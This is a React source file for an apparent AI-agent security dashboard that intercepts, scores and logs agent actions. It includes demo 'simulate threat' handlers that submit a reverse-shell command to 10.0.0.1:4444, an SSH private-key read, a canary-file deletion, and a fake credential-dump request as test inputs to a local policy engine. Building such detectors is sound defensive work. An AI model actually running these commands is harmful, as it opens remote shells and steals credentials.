'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import {
  ActivitySvg,
  ShieldCheckSvg,
  ShieldAlertSvg,
} from '@/components/icons/SvgIcons';
import {
  getRecentActions,
  interceptAction,
  getAlerts,
  explainAction,
  ActionLog,
  ActionExplanation,
} from '@/lib/daemon';
import PermissionPromptDialog, { PromptAction } from '@/components/PermissionPromptDialog';
import SplashScreen from '@/components/ui/SplashScreen';
import OfflineBanner from '@/components/ui/OfflineBanner';
import { useDaemon } from '@/context/DaemonContext';
import { formatLocalTime } from '@/lib/dateUtils';

const sampleScanTargets: Record<string, string> = {
  url: 'https://security-payload-verification.internal-scada.org/auth/token?sig=4bf02',
  email: 'urgent-account-validation@internal-sec-audit.portal-gateway.net',
  file: 'threat_samples/malicious_exfiltration.env',
  ip: '198.51.100.24 (AS40201 - Malicious Proxy / BGP Anomaly)',
  text: 'POST /v2/internal/credentials/dump HTTP/1.1\nHost: admin.scada.gov\nAuthorization: Bearer null\nX-Exploit-Payload: \\x7f\\x45\\x4c\\x46\\x02\\x01\\x01',
};

export default function DashboardPage() {
  const { status, mode, rawMode, dbConnected, canaryCount, latencyMs, lastSeenAt, refresh: refreshDaemon } = useDaemon();
  const isOnline = status === 'online';

  const [daemonActions, setDaemonActions] = useState<ActionLog[]>([]);
  const [scanMode, setScanMode] = useState<string>('url');
  const [scanInput, setScanInput] = useState<string>(sampleScanTargets.url);
  const [isScanning, setIsScanning] = useState<boolean>(false);

  const [threatResult, setThreatResult] = useState({
    id: 'INITIAL-IDLE',
    score: 0,
    riskLevel: 'Standby',
    classification: 'Ready for evaluation',
    subVector: 'Deterministic Policy Engine',
    confidence: '100%',
    indicators: [
      { label: 'Target Type:', value: 'URL' },
      { label: 'Policy Engine:', value: isOnline ? 'Online' : 'Offline' },
      { label: 'Database:', value: dbConnected ? 'Connected' : 'Unavailable' },
      { label: 'Canary Files:', value: isOnline ? `${canaryCount} monitored` : 'Offline' },
      { label: 'Heuristic Scorer:', value: isOnline ? 'Ready' : 'Offline' },
      { label: 'Audit Log:', value: 'Chained SHA-256' },
    ],
    verdict: 'Submit any target URL, honeypot file, IP address, or system command above to evaluate deterministic risk live via SentinelAI.',
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    verifiedMatch: false,
  });

  const [filterSeverity, setFilterSeverity] = useState<string>('ALL');
  const [searchTerm, setSearchTerm] = useState<string>('');
  const [activePrompt, setActivePrompt] = useState<PromptAction | null>(null);
  const [selectedAction, setSelectedAction] = useState<ActionLog | null>(null);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [showSplash, setShowSplash] = useState(true);
  const [isTriggeringAction, setIsTriggeringAction] = useState(false);
  const [actionSuccessNotice, setActionSuccessNotice] = useState<string | null>(null);
  const [showDemoMenu, setShowDemoMenu] = useState(false);

  // Update dynamic indicators when online status changes
  useEffect(() => {
    setThreatResult((prev) => ({
      ...prev,
      indicators: [
        { label: 'Target Type:', value: scanMode.toUpperCase() },
        { label: 'Policy Engine:', value: isOnline ? 'Online' : 'Offline' },
        { label: 'Database:', value: dbConnected ? 'Connected' : 'Unavailable' },
        { label: 'Canary Files:', value: isOnline ? `${canaryCount} monitored` : 'Offline' },
        { label: 'Heuristic Scorer:', value: isOnline ? 'Ready' : 'Offline' },
        { label: 'Audit Log:', value: 'Chained SHA-256' },
      ],
      verdict: isOnline
        ? 'Submit any target URL, honeypot file, IP address, or system command above to evaluate deterministic risk live via SentinelAI.'
        : 'Security daemon is offline. Real-time target evaluation suspended until daemon is started on port 8765.',
    }));
  }, [isOnline, dbConnected, canaryCount, scanMode]);

  const syncActions = async () => {
    if (!isOnline) return;
    setIsRefreshing(true);
    try {
      const [actions, alerts] = await Promise.all([
        getRecentActions(200).catch(() => []),
        getAlerts().catch(() => []),
      ]);
      setDaemonActions(actions);

      // Auto-trigger live Permission Prompt Dialog if an unread alert with action_id exists
      const pendingPromptAlert = alerts.find((a) => a.action_id && !a.is_read);
      if (pendingPromptAlert && pendingPromptAlert.action_id) {
        setActivePrompt((curr) => {
          if (!curr || curr.id !== pendingPromptAlert.action_id) {
            return {
              id: pendingPromptAlert.action_id!,
              agentId: 'Claude Code',
              actionType: pendingPromptAlert.title.includes('DELETE') ? 'DELETE' : 'EXECUTE',
              targetPath: pendingPromptAlert.title.split('on ')[1] || 'Protected Resource',
              riskScore: pendingPromptAlert.severity === 'CRITICAL' ? 95 : 75,
              riskCategory: (pendingPromptAlert.severity as any) || 'CRITICAL',
              reasonCode: 'LIVE_PROMPT_INTERCEPTION',
              explanation: pendingPromptAlert.description,
              fileContext: {
                size: 'Target file on system',
                isGitTracked: false,
                lastModified: 'Live stream',
                inScope: false,
              },
            };
          }
          return curr;
        });
      }
    } catch {
      // offline handled gracefully
    } finally {
      setIsRefreshing(false);
    }
  };

  useEffect(() => {
    syncActions();
    const interval = setInterval(syncActions, 4000);
    return () => clearInterval(interval);
  }, [isOnline]);

  const handleModeChange = (mode: string) => {
    setScanMode(mode);
    setScanInput(sampleScanTargets[mode] || '');
  };

  const handleTriggerRealAction = async () => {
    if (!isOnline) return;
    setIsTriggeringAction(true);
    try {
      const res = await interceptAction({
        agent_id: 'claude-code',
        agent_type: 'AUTONOMOUS',
        action_type: 'FILE_DELETE',
        operation: 'DELETE',
        target_path: 'sentinel_canary.env',
        command: 'rm sentinel_canary.env',
      });
      setFilterSeverity('ALL');
      setSearchTerm('');
      await syncActions();
      setActionSuccessNotice(
        `Intercepted Honeypot Deletion: ${res.decision} (Risk: ${res.risk_score}/100 - CRITICAL). Logged to SQLite!`
      );
      setTimeout(() => setActionSuccessNotice(null), 5000);
    } catch (err) {
      console.error('Failed to trigger honeypot action:', err);
    } finally {
      setIsTriggeringAction(false);
    }
  };

  const handleTriggerCredentialThreat = async () => {
    if (!isOnline) return;
    setIsTriggeringAction(true);
    try {
      const res = await interceptAction({
        agent_id: 'claude-code',
        agent_type: 'AUTONOMOUS',
        action_type: 'CREDENTIAL_ACCESS',
        operation: 'READ',
        target_path: '~/.ssh/id_rsa',
        command: 'cat ~/.ssh/id_rsa',
      });
      setFilterSeverity('ALL');
      setSearchTerm('');
      await syncActions();
      setActionSuccessNotice(
        `Hard Blocked Traversal: ${res.decision} (Risk: ${res.risk_score}/100 - HARD_BLOCK). Logged to SQLite!`
      );
      setTimeout(() => setActionSuccessNotice(null), 5000);
    } catch (err) {
      console.error('Failed to trigger credential threat:', err);
    } finally {
      setIsTriggeringAction(false);
    }
  };

  const handleTriggerShellThreat = async () => {
    if (!isOnline) return;
    setIsTriggeringAction(true);
    try {
      const res = await interceptAction({
        agent_id: 'claude-code',
        agent_type: 'AUTONOMOUS',
        action_type: 'SHELL_EXEC',
        operation: 'EXECUTE',
        target_path: 'reverse_shell.sh',
        command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      });
      setFilterSeverity('ALL');
      setSearchTerm('');
      await syncActions();
      setActionSuccessNotice(
        `Blocked Reverse Shell: ${res.decision} (Risk: ${res.risk_score}/100). Logged to SQLite!`
      );
      setTimeout(() => setActionSuccessNotice(null), 5000);
    } catch (err) {
      console.error('Failed to trigger reverse shell action:', err);
    } finally {
      setIsTriggeringAction(false);
    }
  };

  const handleTriggerSafeAction = async () => {
    if (!isOnline) return;
    setIsTriggeringAction(true);
    try {
      const res = await interceptAction({
        agent_id: 'claude-code',
        agent_type: 'AUTONOMOUS',
        action_type: 'FILE_READ',
        operation: 'READ',
        target_path: 'docs/README.md',
        command: 'cat docs/README.md',
      });
      setFilterSeverity('ALL');
      setSearchTerm('');
      await syncActions();
      setActionSuccessNotice(
        `Allowed Workspace Read: ${res.decision} (Risk: ${res.risk_score}/100 - SAFE). Logged to SQLite!`
      );
      setTimeout(() => setActionSuccessNotice(null), 5000);
    } catch (err) {
      console.error('Failed to trigger safe read action:', err);
    } finally {
      setIsTriggeringAction(false);
    }
  };

  const handleRunAnalysis = async () => {
    if (!scanInput.trim() || !isOnline) return;
    setIsScanning(true);

    try {
      const res = await interceptAction({
        agent_id: 'heuristic-analyst',
        agent_type: 'HEURISTIC_SCANNER',
        action_type: scanMode === 'file' ? 'FILE_MUTATE' : 'NETWORK_ACCESS',
        operation: scanMode === 'file' ? 'MUTATE' : 'ACCESS',
        target_path: scanMode === 'file' ? scanInput : undefined,
        target_url: scanMode === 'url' ? scanInput : undefined,
        command: `inspect ${scanMode}:${scanInput}`,
      });

      const isCritical = res.risk_score >= 80;
      const isElevated = res.risk_score >= 40 && res.risk_score < 80;

      let explanationText = res.explanation;
      try {
        const exp = await explainAction({
          action_id: (res as any).action_id || 'act-eval',
          agent_id: 'heuristic-analyst',
          action_type: scanMode === 'file' ? 'FILE_MUTATE' : 'NETWORK_ACCESS',
          target_path: scanMode === 'file' ? scanInput : undefined,
          target_url: scanMode === 'url' ? scanInput : undefined,
          command: `inspect ${scanMode}:${scanInput}`,
          risk_score: res.risk_score,
        });
        if (exp && exp.security_warning) {
          explanationText = `${exp.silent_activity} ${exp.security_warning}`;
        }
      } catch {
        // Fallback to explanation
      }

      setThreatResult({
        id: `SCAN-${Date.now().toString(36).toUpperCase()}`,
        score: res.risk_score,
        riskLevel: isCritical ? 'CRITICAL RISK' : isElevated ? 'ELEVATED RISK' : 'LOW RISK',
        classification: `${res.decision} // ${res.explanation}`,
        subVector: `${scanMode.toUpperCase()} Vector Inspection`,
        confidence: '98.5%',
        indicators: [
          { label: 'Target Type:', value: scanMode.toUpperCase() },
          { label: 'Policy Engine:', value: isOnline ? 'Online' : 'Offline' },
          { label: 'Database:', value: dbConnected ? 'Connected' : 'Unavailable' },
          { label: 'Decision:', value: res.decision },
          { label: 'Heuristic Scorer:', value: 'Ready' },
          { label: 'Audit Log:', value: 'Chained SHA-256' },
        ],
        verdict: explanationText,
        sha256: 'a3b8c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        verifiedMatch: true,
      });

      await syncActions();
    } catch (err: any) {
      console.error('Heuristic evaluation failed:', err);
    } finally {
      setIsScanning(false);
    }
  };

  const handleExportLogs = () => {
    if (!daemonActions.length) return;
    const headers = ['Action ID', 'Agent', 'Action Type', 'Target', 'Risk Score', 'Verdict', 'Timestamp'];
    const rows = daemonActions.map((a) => [
      `"${a.id}"`,
      `"${a.agent_id || 'unknown'}"`,
      `"${a.action_type}"`,
      `"${(a.target_path || '').replace(/"/g, '""')}"`,
      a.risk_score,
      `"${a.outcome}"`,
      `"${a.created_at}"`,
    ]);
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((r) => r.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `sentinel_audit_feed_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const displayActions = daemonActions.filter((act) => {
    const matchSearch =
      searchTerm === '' ||
      act.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (act.agent_id && act.agent_id.toLowerCase().includes(searchTerm.toLowerCase())) ||
      act.action_type.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (act.target_path && act.target_path.toLowerCase().includes(searchTerm.toLowerCase()));

    const matchSev =
      filterSeverity === 'ALL' ||
      (filterSeverity === 'CRITICAL' && act.risk_score >= 80) ||
      (filterSeverity === 'ELEVATED' && act.risk_score >= 40 && act.risk_score < 80) ||
      (filterSeverity === 'SAFE' && act.risk_score < 40);

    return matchSearch && matchSev;
  });

  const totalActionsCount = daemonActions.length;
  const criticalThreatsCount = daemonActions.filter((a) => a.risk_score >= 80).length;
  const elevatedRisksCount = daemonActions.filter((a) => a.risk_score >= 40 && a.risk_score < 80).length;
  const containedBlocksCount = daemonActions.filter((a) => a.outcome?.includes('BLOCK')).length;

  return (
    <>
      {showSplash && <SplashScreen onComplete={() => setShowSplash(false)} minDuration={2000} />}

      <div className="space-y-6 max-w-7xl mx-auto">
        <OfflineBanner />

        {/* 1. Header Overview (No eyebrow lines) */}
        <section className="flex flex-col md:flex-row md:items-end justify-between gap-4 pb-4 border-b border-line">
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <span
                className={`size-2 rounded-pill ${
                  isOnline ? 'bg-safe animate-pulse' : 'bg-critical'
                }`}
              />
              <span
                className={`text-xs font-mono font-medium ${
                  isOnline ? 'text-safe-ink' : 'text-critical-ink'
                }`}
              >
                {isOnline
                  ? `Workstation active • Port 8765 (${latencyMs !== null ? `${latencyMs}ms` : 'online'})`
                  : 'Daemon offline • Local protection suspended'}
              </span>
            </div>
            <h1 className="text-3xl font-display font-bold text-ink-1 tracking-tight text-balance">
              Runtime Security Overview
            </h1>
            <p className="text-xs text-ink-2 text-pretty max-w-2xl">
              Autonomous runtime agent governance, deterministic risk prevention, and cryptographic SQLite flight recorder.
            </p>
          </div>

          {/* Quick Actions Toolbar */}
          <div className="flex items-center gap-2">
            <button
              onClick={() => {
                refreshDaemon();
                syncActions();
              }}
              disabled={isRefreshing}
              aria-label="Refresh telemetry from daemon"
              className="px-4 py-2 rounded-pill bg-surface hover:bg-well border border-line text-xs font-medium text-ink-1 transition-colors shadow-xs flex items-center gap-2 disabled:opacity-50"
            >
              <ActivitySvg className={`size-3.5 text-brand ${isRefreshing ? 'animate-spin' : ''}`} />
              <span>Refresh</span>
            </button>

            {/* Test Simulation Dropdown Menu */}
            <div className="relative">
              <button
                onClick={() => setShowDemoMenu(!showDemoMenu)}
                disabled={!isOnline}
                title={!isOnline ? 'Daemon offline. Start local service on port 8765 to simulate threats.' : undefined}
                className="px-4 py-2 rounded-pill bg-brand hover:bg-brand-hover text-white text-xs font-semibold transition-colors shadow-xs flex items-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed"
              >
                <ShieldAlertSvg className="size-3.5" />
                <span>Simulate threat</span>
                <span className="text-[10px] opacity-80">▾</span>
              </button>

              {showDemoMenu && isOnline && (
                <div className="absolute right-0 mt-2 w-56 rounded-card bg-surface border border-line shadow-card p-2 z-50 text-xs space-y-1 animate-in fade-in duration-100">
                  <button
                    onClick={() => {
                      setShowDemoMenu(false);
                      handleTriggerCredentialThreat();
                    }}
                    className="w-full text-left px-3 py-2 rounded-well hover:bg-critical-soft text-critical-ink transition-colors flex items-center justify-between"
                  >
                    <span>Credential leak (.env)</span>
                    <span className="text-[10px] font-mono font-bold">BLOCK</span>
                  </button>
                  <button
                    onClick={() => {
                      setShowDemoMenu(false);
                      handleTriggerShellThreat();
                    }}
                    className="w-full text-left px-3 py-2 rounded-well hover:bg-caution-soft text-caution-ink transition-colors flex items-center justify-between"
                  >
                    <span>Reverse shell (.sh)</span>
                    <span className="text-[10px] font-mono font-bold">BLOCK</span>
                  </button>
                  <button
                    onClick={() => {
                      setShowDemoMenu(false);
                      handleTriggerRealAction();
                    }}
                    className="w-full text-left px-3 py-2 rounded-well hover:bg-critical-soft text-critical-ink transition-colors flex items-center justify-between"
                  >
                    <span>Canary honeypot file</span>
                    <span className="text-[10px] font-mono font-bold">BLOCK</span>
                  </button>
                  <button
                    onClick={() => {
                      setShowDemoMenu(false);
                      handleTriggerSafeAction();
                    }}
                    className="w-full text-left px-3 py-2 rounded-well hover:bg-safe-soft text-safe-ink transition-colors flex items-center justify-between"
                  >
                    <span>Safe documentation read</span>
                    <span className="text-[10px] font-mono font-bold">ALLOW</span>
                  </button>
                  <button
                    onClick={() => {
                      setShowDemoMenu(false);
                      setActivePrompt({
                        id: 'act-prompt-' + Date.now().toString(36),
                        agentId: 'Claude Code',
                        actionType: 'DELETE',
                        targetPath: '~/project/src/main.py',
                        riskScore: 47,
                        riskCategory: 'MEDIUM',
                        reasonCode: 'UNTRACKED_FILE_DELETION',
                        explanation:
                          'Claude Code wants to delete a file you modified recently but have not committed to git.',
                        fileContext: {
                          size: '14.2 KB (247 lines)',
                          isGitTracked: false,
                          lastModified: '12 minutes ago',
                          inScope: true,
                        },
                      });
                    }}
                    className="w-full text-left px-3 py-2 rounded-well hover:bg-brand-soft text-brand-ink transition-colors flex items-center justify-between"
                  >
                    <span>Interactive prompt modal</span>
                    <span className="text-[10px] font-mono font-bold">PROMPT</span>
                  </button>
                </div>
              )}
            </div>
          </div>
        </section>

        {/* Notice Banner */}
        {actionSuccessNotice && (
          <div className="p-4 rounded-well bg-safe-soft text-safe-ink text-xs font-mono flex items-center justify-between animate-in fade-in duration-150">
            <span>{actionSuccessNotice}</span>
            <button onClick={() => setActionSuccessNotice(null)} className="font-bold text-sm">✕</button>
          </div>
        )}

        {/* 2. Key Metrics Grid - Fixed 3-Row Structure, 20px card radius, no border */}
        <section className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Card 1: Total Interceptions */}
          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
              <span className="font-medium truncate">Total Interceptions</span>
              <div className="size-6 flex items-center justify-end shrink-0">
                <span className="size-2 rounded-pill bg-safe" />
              </div>
            </div>

            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-ink-1">
              {totalActionsCount}
            </div>

            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
              <span>Recorded in SQLite</span>
              {!isOnline && lastSeenAt && (
                <span className="text-[10px] px-2 py-0.5 rounded-pill bg-caution-soft text-caution-ink font-semibold">Cached</span>
              )}
            </div>
          </div>

          {/* Card 2: Critical Threats */}
          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
              <span className="font-medium truncate">Critical Threats</span>
              <div className="size-6 flex items-center justify-end shrink-0">
                <span className="size-2 rounded-pill bg-critical" />
              </div>
            </div>

            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-critical-ink">
              {criticalThreatsCount}
            </div>

            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
              <span>{criticalThreatsCount} high-risk events</span>
              <span className="text-[10px] px-2 py-0.5 rounded-pill bg-critical-soft text-critical-ink font-semibold">
                Score &ge; 80
              </span>
            </div>
          </div>

          {/* Card 3: Elevated Risks */}
          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
              <span className="font-medium truncate">Supervised Prompts</span>
              <div className="size-6 flex items-center justify-end shrink-0">
                <span className="size-2 rounded-pill bg-caution" />
              </div>
            </div>

            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-caution-ink">
              {elevatedRisksCount}
            </div>

            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
              <span>Awaiting confirmation</span>
              <span className="text-[10px] px-2 py-0.5 rounded-pill bg-caution-soft text-caution-ink font-semibold">
                Score 40-79
              </span>
            </div>
          </div>

          {/* Card 4: Contained Threats */}
          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
              <span className="font-medium truncate">Contained Threats</span>
              <div className="size-6 flex items-center justify-end shrink-0">
                <ShieldCheckSvg className="size-4 text-safe-ink" />
              </div>
            </div>

            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-safe-ink">
              {containedBlocksCount}
            </div>

            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
              <span>{containedBlocksCount} blocked in session</span>
              <span className="text-[10px] px-2 py-0.5 rounded-pill bg-safe-soft text-safe-ink font-semibold">Isolated</span>
            </div>
          </div>
        </section>

        {/* 3. Interactive Target Evaluation & Verdict Panel */}
        <section className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-stretch">
          {/* Target Inspector Card */}
          <div className="flex flex-col h-full p-6 rounded-card bg-surface shadow-card">
            <div className="flex items-center justify-between pb-3 border-b border-line">
              <div>
                <h3 className="text-base font-display font-bold text-ink-1">
                  Heuristic Target Evaluation
                </h3>
                <p className="text-xs text-ink-2">
                  Evaluate digital targets live against deterministic security policies.
                </p>
              </div>
              <span className="text-[10px] font-mono px-3 py-1 rounded-pill bg-well text-ink-2 font-medium">
                Port 8765
              </span>
            </div>

            {/* Form Section */}
            <div className="flex-1 flex flex-col space-y-4 pt-4">
              {/* Segmented Mode Selector with Pill Radius */}
              <div className="inline-flex p-1 rounded-pill bg-well text-xs font-medium text-ink-2">
                {(['url', 'email', 'file', 'ip', 'text'] as const).map((mode) => (
                  <button
                    key={mode}
                    onClick={() => handleModeChange(mode)}
                    className={`flex-1 py-1.5 px-3 rounded-pill transition-all ${
                      scanMode === mode
                        ? 'bg-surface text-ink-1 font-bold shadow-card'
                        : 'hover:text-ink-1'
                    }`}
                  >
                    {mode === 'ip' ? 'IP' : mode.toUpperCase()}
                  </button>
                ))}
              </div>

              {/* Textarea stretches to fill dead space */}
              <div className="flex-1 flex flex-col space-y-1.5 min-h-[140px]">
                <label className="text-[11px] font-mono text-ink-3 uppercase font-medium">
                  Target Input for Inspection
                </label>
                <textarea
                  value={scanInput}
                  onChange={(e) => setScanInput(e.target.value)}
                  disabled={!isOnline}
                  className="flex-1 w-full p-3.5 rounded-well bg-well border border-line text-xs text-ink-1 font-mono focus:outline-none focus-visible:ring-2 focus-visible:ring-brand transition-all resize-none disabled:opacity-50"
                  placeholder="Enter target URL, honeypot file, or command payload..."
                />
              </div>

              {/* Presets */}
              {scanMode === 'file' && (
                <div className="space-y-1.5 text-xs">
                  <span className="text-[11px] font-mono text-ink-3">Workspace presets:</span>
                  <div className="flex flex-wrap gap-1.5">
                    {[
                      { label: 'Credential leak (.env)', file: 'threat_samples/malicious_exfiltration.env' },
                      { label: 'Reverse shell (.sh)', file: 'threat_samples/reverse_shell.sh' },
                    ].map((sample) => (
                      <button
                        key={sample.label}
                        onClick={() => setScanInput(sample.file)}
                        className="px-3 py-1 rounded-pill bg-well hover:bg-well/80 text-[11px] font-mono text-ink-2 hover:text-ink-1 transition-colors"
                      >
                        {sample.label}
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Action Button */}
              <div className="pt-2">
                <button
                  onClick={handleRunAnalysis}
                  disabled={isScanning || !isOnline}
                  title={!isOnline ? 'Daemon offline. Start local service on port 8765 to enable actions.' : undefined}
                  className="w-full py-3 rounded-pill bg-brand hover:bg-brand-hover text-white font-bold text-xs transition-colors shadow-xs flex items-center justify-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed"
                >
                  <ActivitySvg className={`size-4 ${isScanning ? 'animate-spin' : ''}`} />
                  <span>
                    {!isOnline
                      ? 'Daemon offline (Evaluation disabled)'
                      : isScanning
                      ? 'Evaluating target...'
                      : 'Evaluate Target'}
                  </span>
                </button>
              </div>
            </div>
          </div>

          {/* Decision Verdict Card (EXACTLY ONCE on Home: --gradient-sky Header) */}
          <div
            className="flex flex-col h-full rounded-card bg-surface shadow-card overflow-hidden justify-between"
            aria-live="polite"
          >
            {/* Verdict Panel Header with --gradient-sky */}
            <div className="bg-gradient-sky p-5 rounded-t-card flex items-center justify-between">
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-[11px] font-mono uppercase font-bold text-[#071E33] tracking-wider">
                    Evaluation Verdict
                  </span>
                  <span className="px-2 py-0.5 rounded-pill bg-lime text-ink-1 text-[9px] font-bold font-mono">
                    VERDICT
                  </span>
                </div>
                <h4 className="text-xl font-display font-bold text-[#071E33] tracking-tight mt-0.5">
                  {threatResult.classification}
                </h4>
              </div>
              <div className="text-right px-3.5 py-1.5 rounded-pill bg-surface/90 shadow-card border border-line">
                <span className="text-[10px] font-mono text-ink-3 block">Risk Score</span>
                <p
                  className={`text-2xl font-display font-bold tabular-nums ${
                    threatResult.score >= 80
                      ? 'text-critical-ink'
                      : threatResult.score >= 40
                      ? 'text-caution-ink'
                      : 'text-safe-ink'
                  }`}
                >
                  {threatResult.score}/100
                </p>
              </div>
            </div>

            <div className="p-6 space-y-4">
              {/* Indicator Grid inside Wells */}
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                {threatResult.indicators.map((ind) => (
                  <div
                    key={ind.label}
                    className="p-3 rounded-well bg-well text-[11px] space-y-0.5"
                  >
                    <span className="text-ink-3 text-[10px] block">{ind.label}</span>
                    <span className="font-semibold text-ink-1 truncate block font-mono">
                      {ind.value}
                    </span>
                  </div>
                ))}
              </div>

              {/* Verdict Explanation Well */}
              <div className="p-4 rounded-well bg-well text-xs text-ink-2 leading-relaxed text-pretty">
                {threatResult.verdict}
              </div>
            </div>

            {/* Live Verification Footer */}
            <div className="p-5 border-t border-line flex items-center justify-between text-[11px] font-mono text-ink-3">
              <span>SHA-256 Ledger</span>
              <span className={threatResult.verifiedMatch ? 'text-safe-ink font-semibold' : 'text-ink-3'}>
                {threatResult.verifiedMatch ? 'Chain verified: Match confirmed' : 'Verification pending scan'}
              </span>
            </div>
          </div>
        </section>

        {/* 4. Live Intercepted Actions Feed Table */}
        <section id="action-feed" className="space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div>
              <h3 className="text-lg font-display font-bold text-ink-1">
                Live Intercepted Feed
              </h3>
              <p className="text-xs text-ink-2">
                Chronological ledger of security decisions evaluated across system processes.
              </p>
            </div>

            <div className="flex items-center gap-2">
              <input
                type="text"
                placeholder="Search actions..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="px-4 py-2 rounded-pill bg-well border border-line text-xs text-ink-1 font-mono focus:outline-none focus-visible:ring-2 focus-visible:ring-brand transition-all"
              />

              <button
                onClick={handleExportLogs}
                disabled={!daemonActions.length}
                className="px-4 py-2 rounded-pill bg-surface hover:bg-well border border-line text-xs font-medium text-ink-1 transition-colors disabled:opacity-50 shadow-xs"
              >
                Export CSV
              </button>
            </div>
          </div>

          {/* Table Container (1px line border, 20px radius, shadow-card) */}
          <div className="rounded-card bg-surface border border-line shadow-card overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead className="bg-well text-ink-3 border-b border-line uppercase text-[10px]">
                  <tr>
                    <th className="py-3 px-4 font-semibold">Time</th>
                    <th className="py-3 px-4 font-semibold">Agent</th>
                    <th className="py-3 px-4 font-semibold">Action</th>
                    <th className="py-3 px-4 font-semibold">Target Resource</th>
                    <th className="py-3 px-4 font-semibold text-center">Risk</th>
                    <th className="py-3 px-4 font-semibold text-right">Verdict</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-line">
                  {displayActions.length === 0 ? (
                    <tr>
                      <td colSpan={6} className="py-12 text-center text-ink-3">
                        {isOnline ? 'No recorded actions match current filters.' : 'Daemon offline. No actions to display.'}
                      </td>
                    </tr>
                  ) : (
                    displayActions.slice(0, 50).map((action) => {
                      const isBlock = action.outcome?.includes('BLOCK');
                      const isPrompt = action.outcome?.includes('PROMPT') || action.outcome?.includes('USER');

                      return (
                        <tr
                          key={action.id}
                          onClick={() => setSelectedAction(action)}
                          className="hover:bg-well/60 transition-colors cursor-pointer"
                        >
                          <td className="py-3 px-4 text-ink-3 tabular-nums whitespace-nowrap">
                            {formatLocalTime(action.created_at)}
                          </td>
                          <td className="py-3 px-4 font-medium text-ink-1 whitespace-nowrap">
                            {action.agent_id || 'system'}
                          </td>
                          <td className="py-3 px-4 whitespace-nowrap">
                            <span className="px-2.5 py-0.5 rounded-pill bg-well text-[10px] text-ink-2 font-mono">
                              {action.action_type}
                            </span>
                          </td>
                          <td className="py-3 px-4 text-ink-2 max-w-xs truncate" title={action.target_path || undefined}>
                            {action.target_path || 'None'}
                          </td>
                          <td className="py-3 px-4 text-center tabular-nums font-semibold">
                            <span
                              className={`px-2.5 py-0.5 rounded-pill text-[10px] font-mono ${
                                action.risk_score >= 80
                                  ? 'bg-critical-soft text-critical-ink font-bold'
                                  : action.risk_score >= 40
                                  ? 'bg-caution-soft text-caution-ink font-bold'
                                  : 'bg-safe-soft text-safe-ink font-medium'
                              }`}
                            >
                              {action.risk_score}/100
                            </span>
                          </td>
                          <td className="py-3 px-4 text-right whitespace-nowrap font-bold">
                            <span
                              className={`px-2.5 py-0.5 rounded-pill text-[10px] font-mono ${
                                isBlock
                                  ? 'bg-critical-soft text-critical-ink'
                                  : isPrompt
                                  ? 'bg-caution-soft text-caution-ink'
                                  : 'bg-safe-soft text-safe-ink'
                              }`}
                            >
                              {action.outcome}
                            </span>
                          </td>
                        </tr>
                      );
                    })
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </section>
      </div>

      {/* Interactive Permission Prompt Dialog */}
      <PermissionPromptDialog
        prompt={activePrompt}
        onClose={() => setActivePrompt(null)}
        onDecisionApplied={syncActions}
      />
    </>
  );
}
